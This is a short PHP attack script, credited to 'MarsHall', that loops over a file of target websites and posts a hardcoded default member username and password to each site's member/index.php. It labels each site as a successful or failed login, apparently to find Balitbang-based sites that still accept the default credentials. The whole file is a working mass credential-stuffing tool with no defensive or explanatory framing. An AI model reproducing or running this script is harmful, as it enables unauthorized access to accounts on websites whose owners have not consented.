<?php

echo "\n>> Balitbang Member Default U/P\n";
echo ">> Created By MarsHall\n\n";

$list = file_get_contents("balit.txt");
$open = explode("\n", $list);
foreach($open as $ht){

        $col = curl_init();
        curl_setopt($col, CURLOPT_URL, $ht."member/index.php");
        curl_setopt($col, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($col, CURLOPT_HEADER, 1);
        curl_setopt($col, CURLOPT_POST, 1);
        curl_setopt($col, CURLOPT_POSTFIELDS, "username=siswanto&password=123456&Submit=1");
        $co = curl_exec($col);
        
 
    if (preg_match("/HTTP\/2 200/i", $co, $result)) {
    
        echo "[+] $ht => Login Berhasil\n";
        
    } elseif (preg_match("/redirecting/", $co, $result)) {
    
        echo "[+] $ht => Login Berhasil\n";
        
    } else {
    
        echo "[×] $ht => Login Gagal\n";
        
    }
       
  }
  
?>